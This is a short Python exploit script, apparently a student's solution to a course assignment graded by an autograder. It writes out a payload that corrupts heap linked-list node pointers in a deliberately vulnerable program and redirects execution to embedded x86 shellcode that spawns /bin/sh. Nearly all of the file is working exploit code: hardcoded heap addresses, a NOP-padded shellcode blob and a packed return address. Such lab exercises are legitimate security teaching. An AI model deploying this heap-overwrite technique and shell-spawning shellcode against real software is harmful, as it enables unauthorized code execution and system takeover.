#!/usr/bin/env python3

import sys
# from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x080dd2e0
node_b = 0x080dd310
node_c = 0x080dd340

# eb xx -> jmp xx -> jump relatively
shellcode = (b"\x90"*2 + b"\xeb\x04" + b"\x90"*4 + b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80")

ret_addr_next = pack('<I', 0xfffe9fc4)
shellcode_location = pack('<I', node_b+0x08)

# Your code here
sys.stdout.buffer.write(b'\x90'*40 + b' ')
sys.stdout.buffer.write(shellcode + b'\x90'*9  + shellcode_location + ret_addr_next + b' ')
sys.stdout.buffer.write(b'c')
